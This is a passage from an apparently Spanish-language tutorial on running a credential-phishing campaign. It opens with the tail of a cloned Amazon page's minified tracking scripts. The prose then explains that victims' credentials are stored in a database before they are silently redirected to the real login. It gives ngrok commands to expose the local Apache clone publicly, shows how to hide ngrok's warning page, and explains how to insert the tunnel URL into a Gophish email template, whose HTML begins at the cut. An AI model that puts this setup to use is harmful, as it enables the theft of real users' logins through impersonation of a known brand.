                                    r.markers[e] = n
                                }
                            }, i.logOptions)
                        }
                    }
                    r && (e(), t.on("$beforePageTransition", e), t.register("Timers", {
                        instance: function(r) {
                            return new i(r || {})
                        }
                    }))
                });
                csa.plugin(function(t) {
                    var e = "takeRecords",
                        i = "disconnect",
                        n = "function",
                        o = t("Metrics", {
                            producerId: "csa"
                        }),
                        c = t("PageTiming"),
                        a = t.global,
                        u = t.timeout,
                        r = t.on,
                        f = a.PerformanceObserver,
                        m = 0,
                        l = !1,
                        s = 0,
                        d = a.performance,
                        h = a.document,
                        v = null,
                        y = !1,
                        g = t.blank;

                    function p() {
                        l || (l = !0, clearTimeout(v), typeof f[e] === n && f[e](), typeof f[i] === n && f[i](), o("recordMetric", "documentCumulativeLayoutShift", m), c("mark", "cumulativeLayoutShiftLastTimestamp", Math.floor(s + d.timing.navigationStart)))
                    }
                    f && d && d.timing && h && (f = new f(function(t) {
                        v && clearTimeout(v);
                        t.getEntries().forEach(function(t) {
                            t.hadRecentInput || (m += t.value, s < t.startTime && (s = t.startTime))
                        }), v = u(p, 5e3)
                    }), function() {
                        try {
                            f.observe({
                                type: "layout-shift",
                                buffered: !0
                            }), v = u(p, 5e3)
                        } catch (t) {}
                    }(), g = r(h, "click", function(t) {
                        y || (y = !0, o("recordMetric", "documentCumulativeLayoutShiftToFirstInput", m), g())
                    }), r(h, "visibilitychange", function() {
                        "hidden" === h.visibilityState && p()
                    }), t.once("$unload", p))
                });
                csa.plugin(function(e) {
                    var t, n = e.global,
                        r = n.PerformanceObserver,
                        c = e("Metrics", {
                            producerId: "csa"
                        }),
                        o = 0,
                        i = 0,
                        a = -1,
                        l = n.Math,
                        f = l.max,
                        u = l.ceil;
                    if (r) {
                        t = new r(function(e) {
                            e.getEntries().forEach(function(e) {
                                var t = e.duration;
                                o += t, i += t, a = f(t, a)
                            })
                        });
                        try {
                            t.observe({
                                type: "longtask",
                                buffered: !0
                            })
                        } catch (e) {}
                        t = new r(function(e) {
                            0 < e.getEntries().length && (i = 0, a = -1)
                        });
                        try {
                            t.observe({
                                type: "largest-contentful-paint",
                                buffered: !0
                            })
                        } catch (e) {}
                        e.on("$unload", g), e.on("$beforePageTransition", g)
                    }

                    function g() {
                        c("recordMetric", "totalBlockingTime", u(i || 0)), c("recordMetric", "totalBlockingTimeInclLCP", u(o || 0)), c("recordMetric", "maxBlockingTime", u(a || 0)), i = o = 0, a = -1
                    }
                });
                csa.plugin(function(o) {
                    var e = "CacheDetection",
                        r = "csa-ctoken-",
                        n = o.store,
                        t = o.deleteStored,
                        c = o.config,
                        a = c[e + ".RequestID"],
                        i = c[e + ".Callback"],
                        s = o.global,
                        u = s.document || {},
                        d = s.Date,
                        l = o("Events"),
                        f = o("Events", {
                            producerId: "csa",
                            lob: c.lob || "0"
                        });

                    function p(e) {
                        try {
                            var n = u.cookie.match(RegExp("(^| )" + e + "=([^;]+)"));
                            return n && n[2].trim()
                        } catch (e) {}
                    }! function() {
                        var e = function() {
                                var e = p("cdn-rid");
                                if (e) return {
                                    r: e,
                                    s: "cdn"
                                }
                            }() || function() {
                                if (o.store(r + a)) return {
                                    r: o.UUID().toUpperCase().replace(/-/g, "").slice(0, 20),
                                    s: "device"
                                }
                            }() || {},
                            n = e.r,
                            c = e.s;
                        if (!!n) {
                            var t = p("session-id");
                            ! function(e, n, c, t) {
                                l("setEntity", {
                                    page: {
                                        pageSource: "cache",
                                        requestId: e,
                                        cacheRequestId: a,
                                        cacheSource: t
                                    },
                                    session: {
                                        id: c
                                    }
                                })
                            }(n, 0, t, c), "device" === c && f("log", {
                                schemaId: "<ns>.CacheImpression.2"
                            }, {
                                ent: "all"
                            }), i && i(n, t, c)
                        }
                    }(), n(r + a, d.now() + 36e5), o.once("$load", function() {
                        var c = d.now();
                        t(function(e, n) {
                            return 0 == e.indexOf(r) && parseInt(n) < c
                        })
                    })
                });
                csa.plugin(function(u) {
                    var i, t = "Content",
                        e = "MutationObserver",
                        n = "addedNodes",
                        a = "querySelectorAll",
                        f = "matches",
                        r = "getAttributeNames",
                        o = "getAttribute",
                        s = "dataset",
                        c = "widget",
                        l = "producerId",
                        d = "slotId",
                        h = "iSlotId",
                        g = {
                            ent: {
                                element: 1,
                                page: ["pageType", "subPageType", "requestId"]
                            }
                        },
                        p = 5,
                        m = u.config[t + ".BubbleUp.SearchDepth"] || 35,
                        y = u.config[t + ".SearchPage"] || 0,
                        v = "csaC",
                        b = v + "Id",
                        E = "logRender",
                        w = {},
                        I = u.config,
                        O = I[t + ".Selectors"] || [],
                        C = I[t + ".WhitelistedAttributes"] || {
                            href: 1,
                            class: 1
                        },
                        N = I[t + ".EnableContentEntities"],
                        S = I["KillSwitch.ContentRendered"],
                        k = u.global,
                        A = k.document || {},
                        U = A.documentElement,
                        L = k.HTMLElement,
                        R = {},
                        _ = [],
                        j = function(t, e, n, i) {
                            var o = this,
                                r = u("Events", {
                                    producerId: t || "csa",
                                    lob: I.lob || "0"
                                });
                            e.type = e.type || c, o.id = e.id, o.l = r, o.e = e, o.el = n, o.rt = i, o.dlo = g, o.op = W(n, "csaOp"), o.log = function(t, e) {
                                r("log", t, e || g)
                            }, o.entities = function(t) {
                                t(e)
                            }, e.id && r("setEntity", {
                                element: e
                            })
                        },
                        x = j.prototype;

                    function D(t) {
                        var e = (t = t || {}).element,
                            n = t.target;
                        return e ? function(t, e) {
                            var n;
                            n = t instanceof L ? K(t) || Y(e[l], t, z, u.time()) : R[t.id] || H(e[l], 0, t, u.time());
                            return n
                        }(e, t) : n ? M(n) : u.error("No element or target argument provided.")
                    }

                    function M(t) {
                        var e = function(t) {
                            var e = null,
                                n = 0;
                            for (; t && n < m;) {
                                if (n++, P(t, b)) {
                                    e = t;
                                    break
                                }
                                t = t.parentElement
                            }
                            return e
                        }(t);
                        return e ? K(e) : new j("csa", {
                            id: null
                        }, null, u.time())
                    }

                    function P(t, e) {
                        if (t && t.dataset) return t.dataset[e]
                    }

                    function T(t, e, n) {
                        _.push({
                            n: n,
                            e: t,
                            t: e
                        }), B()
                    }

                    function q() {
                        for (var t = u.time(), e = 0; 0 < _.length;) {
                            var n = _.shift();
                            if (w[n.n](n.e, n.t), ++e % 10 == 0 && u.time() - t > p) break
                        }
                        i = 0, _.length && B()
                    }

                    function B() {
                        i = i || u.raf(q)
                    }

                    function X(t, e, n) {
                        return {
                            n: t,
                            e: e,
                            t: n
                        }
                    }

                    function Y(t, e, n, i) {
                        var o = u.UUID(),
                            r = {
                                id: o
                            },
                            c = M(e);
                        return e[s][b] = o, n(r, e), c && c.id && (r.parentId = c.id), H(t, e, r, i)
                    }

                    function $(t) {
                        return isNaN(t) ? null : Math.round(t)
                    }

                    function H(t, e, n, i) {
                        N && (n.schemaId = "<ns>.ContentEntity.2"), n.id = n.id || u.UUID();
                        var o = new j(t, n, e, i);
                        return function(t) {
                            return !S && ((t.op || {}).hasOwnProperty(E) || y)
                        }(o) && function(t, e) {
                            var n = {},
                                i = u.exec($);
                            t.el && (n = t.el.getBoundingClientRect()), t.log({
                                schemaId: "<ns>.ContentRender.3",
                                timestamp: e,
                                width: i(n.width),
                                height: i(n.height),
                                positionX: i(n.left + k.pageXOffset),
                                positionY: i(n.top + k.pageYOffset)
                            })
                        }(o, i), u.emit("$content.register", o), R[n.id] = o
                    }

                    function K(t) {
                        return R[(t[s] || {})[b]]
                    }

                    function W(n, i) {
                        var o = {};
                        return r in (n = n || {}) && Object.keys(n[s]).forEach(function(t) {
                            if (!t.indexOf(i) && i.length < t.length) {
                                var e = function(t) {
                                    return (t[0] || "").toLowerCase() + t.slice(1)
                                }(t.slice(i.length));
                                o[e] = n[s][t]
                            }
                        }), o
                    }

                    function z(t, e) {
                        r in e && (function(t, e) {
                            var n = W(t, v);
                            Object.keys(n).forEach(function(t) {
                                e[t] = n[t]
                            })
                        }(e, t), d in t && (t[h] = t[d]), function(e, n) {
                            (e[r]() || []).forEach(function(t) {
                                t in C && (n[t] = e[o](t))
                            })
                        }(e, t))
                    }
                    U && A[a] && k[e] && (O.push({
                        selector: "*[data-csa-c-type]",
                        entity: z
                    }), O.push({
                        selector: ".celwidget",
                        entity: function(t, e) {
                            z(t, e), t[d] = t[d] || e[o]("cel_widget_id") || e.id, t.legacyId = e[o]("cel_widget_id") || e.id, t.type = t.type || c
                        }
                    }), w[1] = function(t, e) {
                        t.forEach(function(t) {
                            t[n] && t[n].constructor && "NodeList" === t[n].constructor.name && Array.prototype.forEach.call(t[n], function(t) {
                                _.unshift(X(2, t, e))
                            })
                        })
                    }, w[2] = function(r, c) {
                        a in r && f in r && O.forEach(function(t) {
                            for (var e = t.selector, n = r[f](e), i = r[a](e), o = i.length - 1; 0 <= o; o--) _.unshift(X(3, {
                                e: i[o],
                                s: t
                            }, c));
                            n && _.unshift(X(3, {
                                e: r,
                                s: t
                            }, c))
                        })
                    }, w[3] = function(t, e) {
                        var n = t.e;
                        K(n) || Y("csa", n, t.s.entity, e)
                    }, w[4] = function() {
                        u.register(t, {
                            instance: D
                        })
                    }, new k[e](function(t) {
                        T(t, u.time(), 1)
                    }).observe(U, {
                        childList: !0,
                        subtree: !0
                    }), T(U, u.time(), 2), T(null, u.time(), 4), u.on("$content.export", function(e) {
                        Object.keys(e).forEach(function(t) {
                            x[t] = e[t]
                        })
                    }))
                });
                csa.plugin(function(o) {
                    var i, t = "ContentImpressions",
                        e = "KillSwitch.",
                        n = "IntersectionObserver",
                        r = "getAttribute",
                        s = "dataset",
                        c = "intersectionRatio",
                        a = "csaCId",
                        m = 1e3,
                        l = o.global,
                        f = o.config,
                        u = f[e + t],
                        v = f[e + t + ".ContentViews"],
                        g = ((l.performance || {}).timing || {}).navigationStart || o.time(),
                        d = {};

                    function h(t) {
                        t && (t.v = 1, function(t) {
                            t.vt = o.time(), t.el.log({
                                schemaId: "<ns>.ContentView.4",
                                timeToViewed: t.vt - t.el.rt,
                                pageFirstPaintToElementViewed: t.vt - g
                            })
                        }(t))
                    }

                    function I(t) {
                        t && !t.it && (t.i = o.time() - t.is > m, function(t) {
                            t.it = o.time(), t.el.log({
                                schemaId: "<ns>.ContentImpressed.3",
                                timeToImpressed: t.it - t.el.rt,
                                pageFirstPaintToElementImpressed: t.it - g
                            })
                        }(t))
                    }!u && l[n] && (i = new l[n](function(t) {
                        var n = o.time();
                        t.forEach(function(t) {
                            var e = function(t) {
                                if (t && t[r]) return d[t[s][a]]
                            }(t.target);
                            if (e) {
                                o.emit("$content.intersection", {
                                    meta: e.el,
                                    t: n,
                                    e: t
                                });
                                var i = t.intersectionRect;
                                t.isIntersecting && 0 < i.width && 0 < i.height && (v || e.v || h(e), .5 <= t[c] && !e.is && (e.is = n, e.timer = o.timeout(function() {
                                    I(e)
                                }, m))), t[c] < .5 && !e.it && e.timer && (l.clearTimeout(e.timer), e.is = 0, e.timer = 0)
                            }
                        })
                    }, {
                        threshold: [0, .5, .99]
                    }), o.on("$content.register", function(t) {
                        var e = t.el;
                        e && (d[t.id] = {
                            el: t,
                            v: 0,
                            i: 0,
                            is: 0,
                            vt: 0,
                            it: 0
                        }, i.observe(e))
                    }))
                });
                csa.plugin(function(e) {
                    e.config["KillSwitch.ContentLatency"] || e.emit("$content.export", {
                        mark: function(t, n) {
                            var o = this;
                            o.t || (o.t = e("Timers", {
                                logger: o.l,
                                schemaId: "<ns>.ContentLatency.4",
                                logOptions: o.dlo
                            })), o.t("mark", t, n)
                        }
                    })
                });
                csa.plugin(function(t) {
                    function n(i, e, o) {
                        var c = {};

                        function r(t, n, e) {
                            t in c && o <= n - c[t].s && (function(n, e, i) {
                                if (!p) return;
                                E(function(t) {
                                    T(n, t), t.w[n][e] = a((t.w[n][e] || 0) + i)
                                })
                            }(t, i, n - c[t].d), c[t].d = n), e || delete c[t]
                        }
                        this.update = function(t, n) {
                            n.isIntersecting && e <= n.intersectionRatio ? function(t, n) {
                                t in c || (c[t] = {
                                    s: n,
                                    d: n
                                })
                            }(t, u()) : r(t, u())
                        }, this.stopAll = function(t) {
                            var n = u();
                            for (var e in c) r(e, n, t)
                        }, this.reset = function() {
                            var t = u();
                            for (var n in c) c[n].s = t, c[n].d = t
                        }
                    }
                    var e = t.config,
                        u = t.time,
                        i = "ContentInteractionsSummary",
                        o = e[i + ".FlushInterval"] || 5e3,
                        c = e[i + ".FlushBackoff"] || 1.5,
                        r = t.global,
                        s = t.on,
                        a = Math.floor,
                        f = (r.document || {}).documentElement || {},
                        l = ((r.performance || {}).timing || {}).responseStart || t.time(),
                        d = o,
                        m = 0,
                        p = !0,
                        v = t.UUID(),
                        g = t("Events", {
                            producerId: "csa",
                            lob: e.lob || "0"
                        }),
                        w = new n("it0", 0, 0),
                        I = new n("it50", .5, 1e3),
                        h = new n("it100", .99, 0),
                        b = {},
                        A = {};

                    function $() {
                        w.stopAll(!0), I.stopAll(!0), h.stopAll(!0), S()
                    }

                    function C() {
                        w.reset(), I.reset(), h.reset(), S()
                    }

                    function S() {
                        d && (clearTimeout(m), m = t.timeout($, d), d *= c)
                    }

                    function U(n) {
                        E(function(t) {
                            T(n, t), t.w[n].mc = (t.w[n].mc || 0) + 1
                        })
                    }

                    function E(t) {
                        g("log", {
                            messageId: v,
                            schemaId: "<ns>.ContentInteractionsSummary.2",
                            w: {},
                            __merge: t
                        }, {
                            ent: {
                                page: ["requestId"]
                            }
                        })
                    }

                    function T(t, n) {
                        t in n.w || (n.w[t] = {})
                    }
                    e["KillSwitch." + i] || (s("$content.intersection", function(t) {
                        if (t && t.meta && t.e) {
                            var n = t.meta.id;
                            if (n in b) {
                                var e = t.e.boundingClientRect || {};
                                e.width < 5 || e.height < 5 || (w.update(n, t.e), I.update(n, t.e), h.update(n, t.e), !t.e.isIntersecting || n in A || (A[n] = 1, function(n, e) {
                                    E(function(t) {
                                        T(n, t), t.w[n].ttfv = a(e)
                                    })
                                }(n, u() - l)))
                            }
                        }
                    }), s("$content.register", function(t) {
                        (t.e || {}).slotId && (b[t.id] = {}, function(e) {
                            E(function(t) {
                                var n = e.id;
                                T(n, t), t.w[n].sid = (e.e || {}).slotId, t.w[n].cid = (e.e || {}).contentId
                            })
                        }(t))
                    }), s("$beforePageTransition", function() {
                        $(), C(), v = t.UUID(), S()
                    }), s("$beforeunload", function() {
                        w.stopAll(), I.stopAll(), h.stopAll(), d = null
                    }), s("$visible", function(t) {
                        t ? C() : ($(), clearTimeout(m)), p = t
                    }, {
                        buffered: 1
                    }), s(f, "click", function(t) {
                        for (var n = t.target, e = 25; n && 0 < e;) {
                            var i = (n.dataset || {}).csaCId;
                            i && U(i), n = n.parentElement, e -= 1
                        }
                    }, {
                        capture: !0,
                        passive: !0
                    }), S())
                });
                csa.plugin(function(d) {
                    var t, o, e = "normal",
                        c = "reload",
                        i = "history",
                        s = "new-tab",
                        n = "ajax",
                        r = 1,
                        a = 2,
                        u = "lastActive",
                        l = "lastInteraction",
                        p = "used",
                        f = "csa-tabbed-browsing",
                        y = "visibilityState",
                        g = "page",
                        v = "experience",
                        b = "request",
                        m = {
                            "back-memory-cache": 1,
                            "tab-switch": 1,
                            "history-navigation-page-cache": 1
                        },
                        I = "<ns>.TabbedBrowsing.4",
                        T = "visible",
                        h = d.global,
                        x = d("Events", {
                            producerId: "csa",
                            lob: d.config.lob || "0"
                        }),
                        w = h.location || {},
                        S = h.document,
                        q = h.JSON,
                        P = ((h.performance || {}).navigation || {}).type,
                        z = d.store,
                        E = d.on,
                        $ = d.storageSupport(),
                        k = !1,
                        A = {},
                        C = {},
                        O = {},
                        j = {},
                        B = {},
                        J = !1,
                        N = !1,
                        R = !1,
                        D = 0;

                    function F(e) {
                        try {
                            return q.parse(z(f, void 0, {
                                session: e
                            }) || "{}") || {}
                        } catch (e) {
                            d.error('Could not parse storage value for key "' + f + '": ' + e)
                        }
                        return {}
                    }

                    function G(e, i) {
                        z(f, q.stringify(i || {}), {
                            session: e
                        })
                    }

                    function H(e) {
                        var i = C.tid || e.id,
                            t = A[u] || {};
                        t.tid === i && (t.pid = e.id, t.ent = B), j = {
                            pid: e.id,
                            tid: i,
                            ent: B,
                            lastInteraction: C[l] || {},
                            initialized: !0
                        }, O = {
                            lastActive: t,
                            lastInteraction: A[l] || {},
                            time: d.time()
                        }
                    }

                    function K(e) {
                        var i = e === s,
                            t = S.referrer,
                            n = !(t && t.length) || !~t.indexOf(w.origin || ""),
                            r = i && n,
                            a = {
                                type: e,
                                toTabId: j.tid,
                                toPageId: j.pid,
                                transitTime: d.time() - A.time || null
                            };
                        r || function(e, i, t) {
                            var n = e === c,
                                r = i ? A[u] || {} : C,
                                a = A[l] || {},
                                d = C[l] || {},
                                o = i ? a : d;
                            t.fromTabId = r.tid, t.fromPageId = r.pid;
                            var s = r.ent || {};
                            s.rid && (t.fromRequestId = s.rid || null), s.ety && (t.fromExperienceType = s.ety || null), s.esty && (t.fromExperienceSubType = s.esty || null), n || !o.id || o[p] || (t.interactionId = o.id || null, o.sid && (t.interactionSlotId = o.sid || null), a.id === o.id && (a[p] = !0), d.id === o.id && (d[p] = !0))
                        }(e, i, a), x("log", {
                            navigation: a,
                            schemaId: I
                        }, {
                            ent: {
                                page: ["pageType", "subPageType", "requestId"]
                            }
                        })
                    }

                    function L(e) {
                        R = function(e) {
                                return e && e in m
                            }(e.transitionType),
                            function() {
                                A = F(!1), C = F(!0);
                                var e = A[l],
                                    i = C[l],
                                    t = !1,
                                    n = !1;
                                e && i && e.id === i.id && e[p] !== i[p] && (t = !e[p], n = !i[p], i[p] = e[p] = !0, t && G(!1, A), n && G(!0, C))
                            }(), H(e), J = !0,
                            function(e) {
                                var i, t;
                                i = Q(), t = U(), (i || t) && H(e)
                            }(e), D = 1
                    }

                    function M() {
                        k && !R ? K(n) : (k = !0, K(P === a || R ? i : P === r ? C.initialized ? c : s : C.initialized ? e : s))
                    }

                    function Q() {
                        var e = t,
                            i = {};
                        return !!(J && e && e.e && e.w) && (e.w("entities", function(e) {
                            i = e || {}
                        }), C[l] = {
                            id: e.e.messageId,
                            sid: i.slotId,
                            used: !(A[l] = {
                                id: e.e.messageId,
                                sid: i.slotId,
                                used: !1
                            })
                        }, !(t = null))
                    }

                    function U() {
                        var e = !1;
                        if (N = S[y] === T, J) {
                            var i = A[u] || {};
                            e = function(e, i, t, n) {
                                var r = !1,
                                    a = e[u];
                                return N ? a && a.tid === j.tid && a[T] && a.pid === t || (e[u] = {
                                    visible: !0,
                                    pid: t,
                                    tid: i,
                                    ent: n
                                }, r = !0) : a && a.tid === j.tid && a[T] && (r = !(a[T] = !1)), r
                            }(A, C.tid || i.tid || j.tid, C.pid || i.pid || j.pid, C.ent || i.ent || j.ent)
                        }
                        return e
                    }
                    $.local && $.session && q && S && y in S && (o = function() {
                        try {
                            return h.self !== h.top
                        } catch (e) {
                            return !0
                        }
                    }(), E("$entities.set", function(e) {
                        if (!o && e) {
                            var i = (e[b] || {}).id || (e[g] || {}).requestId,
                                t = (e[v] || {}).experienceType || (e[g] || {}).pageType,
                                n = (e[v] || {}).experienceSubType || (e[g] || {}).subPageType,
                                r = !B.rid && i || !B.ety && t || !B.esty && n;
                            if (B.rid = B.rid || i, B.ety = B.ety || t, B.esty = B.esty || n, r && D) {
                                var a = A[u] || {};
                                a.tid === C.tid && (a.ent = B, G(!1, A)), C.ent = B, G(!0, C)
                            }
                        }
                    }, {
                        buffered: 1
                    }), E("$pageChange", function(e) {
                        o || (L(e), M(), G(!1, O), G(!0, j), C = j, A = O)
                    }, {
                        buffered: 1
                    }), E("$content.interaction", function(e) {
                        t = e, Q() && (G(!1, A), G(!0, C))
                    }), E(S, "visibilitychange", function() {
                        !o && U() && G(!1, A)
                    }, {
                        capture: !1,
                        passive: !0
                    }))
                });
                csa.plugin(function(c) {
                    var e = c("Metrics", {
                        producerId: "csa"
                    });
                    c.on(c.global, "pageshow", function(c) {
                        c && c.persisted && e("recordMetric", "bfCache", 1)
                    })
                });
                csa.plugin(function(n) {
                    var e, t, i, o, r, a, c, u, f, s, l, d, m, p, g, v, h = "hasFocus",
                        b = "$app.",
                        y = "avail",
                        S = "client",
                        T = "document",
                        $ = "inner",
                        I = "offset",
                        P = "screen",
                        w = "scroll",
                        D = "Width",
                        E = "Height",
                        F = y + D,
                        O = y + E,
                        q = S + D,
                        x = S + E,
                        z = $ + D,
                        C = $ + E,
                        H = I + D,
                        K = I + E,
                        M = w + D,
                        W = w + E,
                        X = n.config,
                        Y = X["KillSwitch.PageInteractionsSummary"],
                        j = n("Events", {
                            producerId: "csa",
                            lob: X.lob || "0"
                        }),
                        k = 1,
                        A = n.global || {},
                        B = n.time,
                        G = n.on,
                        J = n.once,
                        L = A[T] || {},
                        N = A[P] || {},
                        Q = A.Math || {},
                        R = Q.abs,
                        U = Q.max,
                        V = Q.ceil,
                        Z = ((A.performance || {}).timing || {}).responseStart,
                        _ = function() {
                            return L[h]()
                        },
                        nn = 1,
                        en = 100,
                        tn = {},
                        on = 1;

                    function rn() {
                        c = t = o = r = e, i = 0, a = u = f = s = 0, un(), cn()
                    }

                    function an() {
                        Z && !o && (c = V((o = l) - Z), on = 1)
                    }

                    function cn() {
                        u = V(U(u, m + v)), d && (f = V(U(f, d + g))), on = 1
                    }

                    function un() {
                        l = B(), d = R(A.pageXOffset || 0), m = R(A.pageYOffset || 0), p = 0 < d || 0 < m, g = A[z] || 0, v = A[C] || 0
                    }

                    function fn() {
                        un(), an(),
                            function() {
                                var n = m - i;
                                t && !(t && t <= l) || (n && (++a, on = 1), i = m, n), t = l + en
                            }(), cn()
                    }

                    function sn() {
                        if (r) {
                            var n = V(B() - r);
                            s += n, r = e, on = 0 < n
                        }
                    }

                    function ln() {
                        r = r || B()
                    }

                    function dn(n, e, t, i) {
                        e[n + D] = V(t || 0), e[n + E] = V(i || 0)
                    }

                    function mn(n) {
                        var e = n === tn,
                            t = _();
                        if (t || on) {
                            if (!e) {
                                if (!k) return;
                                k = 0, t && sn()
                            }
                            var i = function() {
                                    var n = {},
                                        e = L.documentElement || {},
                                        t = L.body || {};
                                    return dn("availableScreen", n, N[F], N[O]), dn(T, n, U(t[M] || 0, t[H] || 0, e[q] || 0, e[M] || 0, e[H] || 0), U(t[W] || 0, t[K] || 0, e[x] || 0, e[W] || 0, e[K] || 0)), dn(P, n, N.width, N.height), dn("viewport", n, A[z], A[C]), n
                                }(),
                                o = function() {
                                    var n = {
                                        scrollCounts: a,
                                        reachedDepth: u,
                                        horizontalScrollDistance: f,
                                        dwellTime: s
                                    };
                                    return "number" == typeof c && (n.clientTimeToFirstScroll = c), n
                                }();
                            e ? on = 0 : (rn(), Z = B(), t && (r = Z)), j("log", {
                                activity: o,
                                dimensions: i,
                                schemaId: "<ns>.PageInteractionsSummary.2"
                            }, {
                                ent: {
                                    page: ["pageType", "subPageType", "requestId"]
                                }
                            })
                        }
                    }

                    function pn() {
                        sn(), mn(tn)
                    }

                    function gn(n, e) {
                        return function() {
                            nn = e, n()
                        }
                    }

                    function vn() {
                        _ = function() {
                            return nn
                        }, nn && !r && (r = B())
                    }
                    "function" != typeof L[h] || Y || (rn(), p && an(), G(A, w, fn, {
                        passive: !0
                    }), G(A, "blur", pn), G(A, "focus", gn(ln, 1)), J(b + "android", vn), J(b + "ios", vn), G(b + "pause", gn(pn, 0)), G(b + "resume", gn(ln, 1)), G(b + "resign", gn(pn, 0)), G(b + "active", gn(ln, 1)), _() && (r = Z || B()), J("$beforeunload", mn), G("$beforeunload", mn), G("$document.hidden", pn), G("$beforePageTransition", mn), G("$afterPageTransition", function() {
                        on = k = 1
                    }))
                });
                csa.plugin(function(e) {
                    var o, n, r = "<ns>.Navigator.5",
                        a = e.global,
                        i = a.navigator || {},
                        d = i.connection || {},
                        c = a.Math.round,
                        t = e("Events", {
                            producerId: "csa",
                            lob: e.config.lob || "0"
                        });

                    function l() {
                        o = {
                            network: {
                                downlink: void 0,
                                downlinkMax: void 0,
                                rtt: void 0,
                                type: void 0,
                                effectiveType: void 0,
                                saveData: void 0
                            },
                            language: void 0,
                            doNotTrack: void 0,
                            hardwareConcurrency: void 0,
                            deviceMemory: void 0,
                            cookieEnabled: void 0,
                            webdriver: void 0
                        }, v(), o.language = i.language || null, o.doNotTrack = function() {
                            switch (i.doNotTrack) {
                                case "1":
                                    return "enabled";
                                case "0":
                                    return "disabled";
                                case "unspecified":
                                    return i.doNotTrack;
                                default:
                                    return null
                            }
                        }(), o.hardwareConcurrency = "hardwareConcurrency" in i ? c(i.hardwareConcurrency || 0) : null, o.deviceMemory = "deviceMemory" in i ? c(i.deviceMemory || 0) : null, o.cookieEnabled = "cookieEnabled" in i ? i.cookieEnabled : null, o.webdriver = "webdriver" in i ? i.webdriver : null
                    }

                    function u() {
                        t("log", {
                            network: (n = {}, Object.keys(o.network).forEach(function(e) {
                                n[e] = o.network[e] + ""
                            }), n),
                            language: o.language,
                            doNotTrack: o.doNotTrack,
                            hardwareConcurrency: o.hardwareConcurrency,
                            deviceMemory: o.deviceMemory,
                            cookieEnabled: o.cookieEnabled,
                            webdriver: o.webdriver,
                            schemaId: r
                        }, {
                            ent: {
                                page: ["pageType", "subPageType", "requestId"]
                            }
                        })
                    }

                    function v() {
                        ! function(n) {
                            Object.keys(o.network).forEach(function(e) {
                                o.network[e] = n[e]
                            })
                        }({
                            downlink: "downlink" in d ? c(d.downlink || 0) : null,
                            downlinkMax: "downlinkMax" in d ? c(d.downlinkMax || 0) : null,
                            rtt: "rtt" in d ? (d.rtt || 0).toFixed() : null,
                            type: d.type || null,
                            effectiveType: d.effectiveType || null,
                            saveData: "saveData" in d ? d.saveData : null
                        })
                    }

                    function k() {
                        v(), u()
                    }

                    function w() {
                        l(), u()
                    }
                    l(), u(), e.on("$afterPageTransition", w), e.on(d, "change", k)
                });


                ue.exec(function(d, c) {
                    function g(e, c) {
                        e && ue.tag(e + c);
                        return !!e
                    }

                    function n() {
                        for (var e = RegExp("^https://(.*\.(images|ssl-images|media)-amazon\.com|" + c.location.hostname + ")/images/", "i"), d = {}, h = 0, k = c.performance.getEntriesByType("resource"), l = !1, b, a, m, f = 0; f < k.length; f++)
                            if (a = k[f], 0 < a.transferSize && a.transferSize >= a.encodedBodySize && (b = e.exec(String(a.name))) && 3 === b.length) {
                                a: {
                                    b = a.serverTiming || [];
                                    for (a = 0; a < b.length; a++)
                                        if ("provider" === b[a].name) {
                                            b = b[a].description;
                                            break a
                                        } b = void 0
                                }
                                b && (l || (l = g(b, "_cdn_fr")),
                                    a = d[b] = (d[b] || 0) + 1, a > h && (m = b, h = a))
                            } g(m, "_cdn_mp")
                    }
                    d.ue && "function" === typeof d.ue.tag && c.performance && c.location && n()
                }, "cdnTagging")(ue_csm, window);


            }

            /* ◬ */
        </script>

    </div>

    <noscript>
        <img height="1" width="1" style='display:none;visibility:hidden;' src='//fls-eu.amazon.com/1/batch/1/OP/A1RKKUPIHCS9HS:260-7076577-0538233:KE82YVBED2PEDHPE6KTZ$uedata=s:%2Fap%2Fuedata%3Fnoscript%26id%3DKE82YVBED2PEDHPE6KTZ:0' alt="" />
    </noscript>

    <script>
        window.ue && ue.count && ue.count('CSMLibrarySize', 48875)
    </script>
</body>

</html>
```

Perspectiva:

<figure><img src="../../.gitbook/assets/error1.png" alt=""><figcaption></figcaption></figure>

Una vez estemos aqui ya se habrian escrito las credenciales en la base de datos, pero cuando le den a `Iniciar sesión` les llevara al verdadero login de la pagina oficial...

Pero esto estara en local por lo que solo nosotros podremos verlo, para ponerlo de forma publica tunelizando nuestro servidor local de `apache2` a un dominio publico por asi decirlo lo haremos con la herramienta `ngrok`...

### <mark style="color:purple;">ngrok \[Configuracion]</mark>

URL = https://ngrok.com/download

Primero lo descargaremos, seleccionaremos el S.O. acorde a donde se este configurando con la arquitectura correspondiente...

En la misma pagina crearemos una cuenta para tener una `API Key`, una vez creada la cuenta y descargado el archivo, descomprimiremos el archivo en la terminal...

```shell
tar -xvzf <FILE>.tgz
```

Esto nos dara el archivo `ngrok` sera el ejecutable que tunelizara el `localhost:7755` (`127.0.0.1:7755`) en el respectivo puerto que lo configuramos de la siguiente manera con nuestra `API Key`...

URL (API Key) = https://dashboard.ngrok.com/get-started/your-authtoken

Aqui podremos ver nuestra `API` para poder hacer lo siguiente...

```shell
./ngrok authtoken <API Key>
```

```shell
./ngrok http 7755
```

Esto iniciara la tunelizacion del `localhost` proporcionando asi la `URL` a la que nos tenemos que conectar para poder visualizar que todo esta funcionando correctamente y la que tendremos que meter en el codigo del `email` de la herramienta `Gophish`...

Perspectiva:

<figure><img src="../../.gitbook/assets/ngrok1.png" alt=""><figcaption></figcaption></figure>

En mi caso me proporciono `https://9b19-90-169-44-222.ngrok-free.app` pero por seguridad y que no les aparezca al usuario la interfaz de `ngrok` detallaremos dode quieres que se redirija al usuario de que archivo de la pagina, quedando de la siguiente forma...

```
URL = https://9b19-90-169-44-222.ngrok-free.app/index.php
```

Asi nos aseguramos que se muestre el `index.php` y esa `URL` es un ejemplo de lo que me salio a mi, pero puede ser distinta...

Una vez que tengamos la `URL` lo cambiaremos en `Gophish` en la seccion de `Tempalte Email` donde pone `{{.URL}}` lo sustituiremos por `https://9b19-90-169-44-222.ngrok-free.app/index.php` por lo que cuando den a un link les llevara al de nuestro `localhost` tunelizado por `ngrok` quedando de la siguiente manera...

```html
<html>
<head>
	<title></title>
	<style type="text/css">.input_letter {
font-size: 17px;
font-weight: bold;
}

.line {
color: grey;
height: 0.1px;
}

.line_head {
color: orange;
height: 10px;
background-color: orange;
border: none;
margin-top: 0px;
}

.box {
background-color: rgba(220, 220, 220,0.45);
border-radius: 3px;
padding: 10px;
font-size: 12.5px;
color: rgb(130, 130, 130);
}

span.letter {
font-family: Verdana, Geneva, Thaoma, sans-serif;
